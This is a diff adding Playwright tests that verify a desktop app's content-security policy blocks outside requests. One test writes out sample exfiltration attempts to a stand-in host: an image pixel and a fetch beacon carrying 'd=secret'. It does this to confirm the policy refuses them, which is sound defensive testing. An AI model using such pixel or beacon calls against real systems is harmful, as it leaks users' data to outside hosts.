@@ -81,3 +81,104 @@ test.describe("offline boot (vendored assets)", () => {
     }
   });
 });
+
+// The content-security policy (the <meta> at the top of ui/index.html, with
+// an identical tag in the fixture). It is the second lock behind the reply
+// cleaner in markdown.jsx: whatever ends up in the page, the interface can
+// load only its own files. If this block is red, a reply, a pasted document
+// or a future bug can make the app call out. Fix it, don't loosen it.
+test.describe("content-security policy", () => {
+  const POLICY = /<meta http-equiv="Content-Security-Policy" content="([^"]+)"/;
+
+  test("ui/index.html and the fixture carry the same policy", async ({ page }) => {
+    const read = async (path) => {
+      const html = await (await page.request.get(path)).text();
+      const m = html.match(POLICY);
+      expect(m, `${path} must carry a Content-Security-Policy meta tag`).not.toBeNull();
+      return m[1];
+    };
+    const app = await read("/ui/index.html");
+    const fixture = await read("/tests/e2e/fixtures/playwright.html");
+    expect(fixture).toBe(app);
+    // The directives the privacy claim rests on.
+    expect(app).toContain("default-src 'self'");
+    expect(app).toContain("img-src 'self' data: blob:");
+    expect(app).toContain("connect-src 'self' ipc: http://ipc.localhost");
+    expect(app).toContain("form-action 'none'");
+    expect(app).not.toMatch(/https:|\*/);
+  });
+
+  test("a remote image and a remote request are refused before they leave", async ({ page }) => {
+    const externalAttempts = [];
+    await page.route("**/*", (route) => {
+      const url = new URL(route.request().url());
+      if (url.hostname === "localhost" || url.hostname === "127.0.0.1") {
+        return route.continue();
+      }
+      externalAttempts.push(url.href);
+      return route.abort();
+    });
+    await page.goto("/tests/e2e/fixtures/playwright.html");
+    await page.waitForFunction(() => window.__JSX_READY === true);
+
+    const result = await page.evaluate(async () => {
+      const refused = [];
+      document.addEventListener("securitypolicyviolation", (e) =>
+        refused.push(e.effectiveDirective || e.violatedDirective),
+      );
+      const img = new Image();
+      const imgDone = new Promise((resolve) => {
+        img.onload = () => resolve("loaded");
+        img.onerror = () => resolve("refused");
+      });
+      img.src = "https://collector.example/pixel.png?d=secret";
+      document.body.appendChild(img);
+      let request = "sent";
+      try {
+        await fetch("https://collector.example/beacon?d=secret");
+      } catch (_) {
+        request = "refused";
+      }
+      const image = await Promise.race([
+        imgDone,
+        new Promise((resolve) => setTimeout(() => resolve("timed out"), 3000)),
+      ]);
+      return { refused, image, request };
+    });
+
+    expect(result.image).toBe("refused");
+    expect(result.request).toBe("refused");
+    expect(result.refused).toEqual(expect.arrayContaining(["img-src", "connect-src"]));
+    // Refused by the policy, so the network layer never saw either one.
+    expect(externalAttempts).toEqual([]);
+  });
+
+  test("the app as shipped boots under its policy without a single violation", async ({ page }) => {
+    await page.addInitScript(() => {
+      window.__CSP_VIOLATIONS = [];
+      document.addEventListener("securitypolicyviolation", (e) =>
+        window.__CSP_VIOLATIONS.push(`${e.effectiveDirective || e.violatedDirective} ${e.blockedURI}`),
+      );
+    });
+    // ui/index.html exactly as shipped, with only the Tauri mock added.
+    await page.route("**/ui/index.html", async (route) => {
+      const res = await route.fetch();
+      const html = (await res.text()).replace(
+        "<head>",
+        '<head>\n<script src="/tests/e2e/fixtures/mock-tauri.js"></script>',
+      );
+      await route.fulfill({ status: 200, contentType: "text/html; charset=utf-8", body: html });
+    });
+    await page.goto("/ui/index.html");
+    // Babel compiled every .jsx file and React mounted the app.
+    await page.waitForFunction(
+      () => (document.getElementById("root")?.childElementCount || 0) > 0,
+      null,
+      { timeout: 20_000 },
+    );
+    await page.evaluate(() => document.fonts.ready);
+    await page.waitForTimeout(500);
+    expect(await page.evaluate(() => window.__CSP_VIOLATIONS)).toEqual([]);
+  });
+});
+
